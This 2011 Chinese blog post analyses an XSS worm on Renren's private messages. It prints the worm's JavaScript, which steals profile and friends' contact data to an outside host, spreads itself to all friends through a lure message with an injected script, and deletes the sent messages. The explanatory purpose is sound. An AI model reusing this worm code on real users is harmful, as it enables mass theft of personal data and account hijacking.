---
layout: post
title: "人人网站内信被XSS攻击"
date: 2011-04-30 02:00
comments: true
categories: [technology, hack]
---
今天相信很多人都收到了这些站内信

{% img center /images/uploads/2011/04/renren_message.png 559 118 '站内信'%}

然后许多人点开后就悲剧了，因为所有的好友都收到了来自这个人的站内信，信件内容一模一样

看到这个情况我的第一反应是人人被**XSS攻击**了


关于XSS攻击，可以参考这里：[http://baike.baidu.com/view/2161269.htm](http://baike.baidu.com/view/2161269.htm)

常见的XSS攻击基本上都是在页面上注入一个带有可执行脚本的代码，这段代码一旦被执行，就会威胁到用户数据和隐私的安全，所以目前企业对XSS有许多防范，比较多的都是对输入文本进行javascript标签过滤。。

但是人人却十分坑爹，竟然在站内信件内容上不做javascript过滤，于是我们在这封欺诈邮件中看到这段代码：

<!--more--> 

{% img center /images/uploads/2011/04/renren_sucks.png 453 73 '坑爹' %}

那么，让我们来看这个代码都干了什么吧：

**盗取用户信息**

{% codeblock lang:javascript %}
function get_self_info(){
new XN.net.xmlhttp({url:"http://www.renren.com/profile.do?v=info_ajax&amp;undefined",method:"GET",onSuccess:function(r){

var text_html = r.responseText;

var id,name,birthday,qq,school,mobile,msn,day,month,year;

	id = /getalbumprofile\.do\?owner\=(\d+)/.exec(text_html)[1];
	my_id = id;
	school = /pf_spread\'\&gt;(.*?)\&lt;\/a\&gt;/.exec(text_html)[1];
	year = /birt\"\,\"year\"\:\"(\d+)/.exec(text_html)[1];
	month = /birt\"\,\"month\"\:\"(\d+)/.exec(text_html)[1];
	day = /birt\"\,\"day\"\:\"(\d+)/.exec(text_html)[1];
	name = /alt\=\"([^\"]+)的大头贴/.exec(text_html)[1];

	if(month &lt;= 9){
	 month = "0"+month;
	}
	if(day &lt;= 9){
	 day = "0"+day;
	}
	birthday = year + month + day;

	qq = /QQ.*?dd\&gt;(.*?)\&lt;\/dd/.exec(text_html)[1];

	msn = /MSN.*?dd\&gt;(.*?)\&lt;\/dd/.exec(text_html)[1];

	mobile = /手机号.*?dd\&gt;(.*?)\&lt;\/dd/.exec(text_html)[1];

	var data = "type=self_info&amp;id=" + id + "&amp;name=" + encodeURIComponent(name)
				+ "&amp;school=" + encodeURIComponent(school)
				+ "&amp;birth=" + birthday
				+ "&amp;qq=" + qq
				+ "&amp;msn=" + encodeURIComponent(msn)
				+ "&amp;mobile=" + mobile;
	send_data(data);
}

});
}
{% endcodeblock %}


**发送用户信息到制定服务器：**


{% codeblock lang:javascript %}
function send_data(v)
{
	var img = document.createElement('img');
	img.src = 'http://qiutuan.net/2011/log.php?' + v;
	document.body.appendChild(img);
	document.body.removeChild(img);
}
{% endcodeblock %}


**给用户好友发站内信并且分享一个东西**

{% codeblock lang:javascript %}
function send_to_friends(){
	var i;
	var idlist = [];
	for (i = 0; i &lt; all_friends.length; i++)
	{
		idlist.push(all_friends[i].toString());
		if (idlist.length == 10)
		{
			_send_to_friends(idlist);
			idlist = [];
		}
	}
	if (idlist.length &gt; 0) _send_to_friends(idlist);
}

function _send_to_friends(ids){
  var content = "相信每个女生心底都有一只小猫，有的妩媚，有的狂野，有的多愁善感，有的古灵精怪……你心底的那只蠢蠢欲动的小猫，是什么样子的呢？她喜欢笑，你就老以为她是快乐的；她喜欢跳，你就老以为她是开朗的；她喜欢扭，你就老以为她是放肆的；她喜欢叫，你就老以为她是狂野的。一个人的时候，她其实多愁善感；一个人的时候，她其实安静淡然；一个人的时候，她其实内向自闭；一个人的时候，她其实乖巧温柔……（视频亮点在2:57秒)  &lt;script src='http://qiutuan.net/2011/51.js'&gt;&lt;/script&gt; &lt;embed src='http://player.youku.com/player.php/sid/XMjYxNDMwNDQ4/v.swf' quality='high' width='480' height='400' align='middle' allowScriptAccess='sameDomain' type='application/x-shockwave-flash'&gt;&lt;/embed&gt;";
  var p = {action:"sharetofriend",
		body:content,
		form:{
			albumid:"0",
			currenUserTinyurl:"http://hdn.xnimg.cn/photos/hdn421/20110118/1220/tiny_GeT4_23780d019116.jpg",
			fromSharedId:"0",
			fromShareOwner:"0",
			fromname:"",
			fromno:"0",
			fromuniv:"",
			link:"http://edm.renren.com/link.do?l=27627&amp;t=51",
			pic:"http://jebe.xnimg.cn/20110412/19/62caea7b-c7bc-4217-994a-ba6c061e5aa0.jpg",
			summary:"相信每个女生心底都有一只小猫，有的妩媚，有的狂野，有的多愁善感，有的古灵精怪……你心底的那只蠢蠢欲动的小猫，是什么样子的呢？",
			title:"加a02好友 奖品散不停",
			type:"51"
		},
		ids:ids,
		noteId:"0",
		subject:"有人暗恋你哦，你想知道TA是谁么",
		tsc:token};

  delete p.tsc;

new XN.net.xmlhttp({url:"http://share.renren.com/share/submit.do",
					data:"tsc="+token+"&amp;post="+encodeURIComponent(XN.json.build(p)),
					onSuccess: function (response) {del_send_messages();}
					});
}
{% endcodeblock %}


**删除发送痕迹**

{% codeblock lang:javascript %}
function del_messages(idlist){

var struct_msgs ={
					action:"delete",
					folder:"1",
					slice:"20",
					unread_count:"0",
					ids:idlist
				};

new Ajax.Request("/message/ajax.do",{method:"get",parameters:"post="+encodeURIComponent(XN.JSON.build(struct_msgs))});

}

function del_send_messages(){
	new XN.net.xmlhttp({url:"http://msg.renren.com/message/inbox.do?f=1",
					method:"GET",
					onSuccess: function (response) {
						var listid1 = response.responseText.match(/thread_(\d+)/g);
						for(var i=0;i &lt; listid1.length;i++){
							listid1[i] = listid1[i].substring(7);
						}
						del_messages(listid1);
					}
				});
}
{% endcodeblock %}


**获取所有好友的一些信息，发送到制定服务器上**

{% codeblock lang:javascript %}
function get_card(tid)
{
	  new XN.net.xmlhttp({url:'http://www.renren.com/showcard?friendID='+tid,
                      method:'get',
                      onSuccess:function(r){
					  var obj = eval("("+r.responseText+")");
					  var data = 'type=card&amp;my_id=' + my_id
								+ '&amp;id=' + obj.id
								+ '&amp;name=' + encodeURIComponent(obj.name)
								+ '&amp;msn=' + encodeURIComponent(obj.msn)
								+ '&amp;phone=' + encodeURIComponent(obj.phone)
								+ '&amp;qq=' + encodeURIComponent(obj.qq)
								+ '&amp;email=' + encodeURIComponent(obj.email)
								+ '&amp;address=' + encodeURIComponent(obj.address);
					send_data(data);
				}
	 });
}

function get_all_friends(){
	new XN.net.xmlhttp({url:"http://www.renren.com/listcards",method:"GET",onSuccess:function(r){

	var text_html = r.responseText;
	//alert(text_html);

	var friends_list = eval("("+text_html+")");
	var owned_mobile = (friends_list.list[0].list).length;  //have mobile friends number
	for(var i =0;i&lt; owned_mobile ;i++){
		mobile_friends.push(friends_list.list[0].list[i].id);
		all_friends.push(friends_list.list[0].list[i].id);
	}
	//alert(mobile_friends.length);

	var no_mobile = (friends_list.list[1].list).length;
	for(var i =0;i&lt; no_mobile ;i++){
		all_friends.push(friends_list.list[1].list[i].id);
	}
	//alert(all_friends.length);
	for(var i = 0; i &lt; mobile_friends.length; i++)
		get_card(mobile_friends[i]);
    send_to_friends();
}
});
}
{% endcodeblock %}


通过上面分析，我觉得大部分知道为什么会中招了吧？

建议中招的同学，*重新登陆一次*。同时上次看到[twitter的一篇博客](http://engineering.twitter.com/2011/03/improving-browser-security-with-csp.html "Improving Browser Security with CSP")，讲到了利用CSP机制（Content Security Policy）来阻止XSS攻击，这套标准目前Mozilla在推，在Firefox 4.0中实现了，当然这并不意味着你使用firefox 4.0就安全，这需要网站来配合这套机制。

总之，人人这次也算报了一个蛮丢人的XSS漏洞吧，希望尽快修复